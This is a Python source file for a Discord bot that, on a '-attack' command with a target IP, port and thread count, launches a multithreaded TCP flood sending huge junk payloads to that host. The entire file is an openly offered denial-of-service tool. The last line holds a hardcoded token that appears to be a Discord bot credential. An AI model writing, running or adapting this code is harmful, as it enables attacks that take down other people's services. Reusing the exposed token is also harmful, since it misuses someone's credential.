import discord
import socket
import os
import ctypes
import colorama
import time
import threading
from colorama import Fore
from discord.ext import commands

colorama.init()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='-', intents=intents)

class ddos:
    def __init__(self):
        self.d = 0
        self.f = 0
        self.e = 0
        self.ipp = ''
        self.PORT = 0

    def setup_ddos(self, ip, port):
        self.ipp = ip
        self.PORT = port

    def rs(self):
        while True:
            gg = self.f
            time.sleep(1)
            self.rse = self.f - gg

    def dd(self):
        while True:
            title = 'Done attacked for ip {} | Error Attack {} By ronaldo <;'.format(self.d, self.e)
            ctypes.windll.kernel32.SetConsoleTitleW(title)

    def DDos(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                sock.connect((self.ipp, self.PORT))
                dataa = b'ehyrteuyiesuyhptuyh' * 999999999
                sock.send(dataa)
                self.d += 1
                self.f += 1
                sock.close()
            except Exception as ex:
                self.e += 1
                print("Error: {}".format(ex))

    def DDos2(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                sock.connect((self.ipp, self.PORT))
                dataa = b'ehyrteuyiesuyhptuyh' * 9999999999
                sock.send(dataa)
                self.d += 1
                self.f += 1
                sock.close()
            except Exception as ex:
                self.e += 1
                print("Error: {}".format(ex))

d = ddos()

@bot.event
async def on_ready():
    print(f'We have logged in {bot.user}')

@bot.command()
async def attack(ctx, ip: str, port: int, threads: int):
    clear = lambda: os.system('cls')
    clear()
    await ctx.send(f"Starting DDOS attack IP: {ip}, PORT: {port}, with {threads} threads")
    print("""
    <*> DDOS :
    <*> lol
    <*> made ronaldo
    """)
    d.setup_ddos(ip, port)
    for _ in range(threads):
        threading.Thread(target=d.DDos).start()
        threading.Thread(target=d.DDos2).start()
        threading.Thread(target=d.dd).start()
        threading.Thread(target=d.rs).start()
bot.run('MTI2NjY1MDg4MzU0Mjg3NjIxMA.GjPiu6.lcSj00O1h0DwcEA8ifP4hMlG3IWN9_jIIEb_8o')
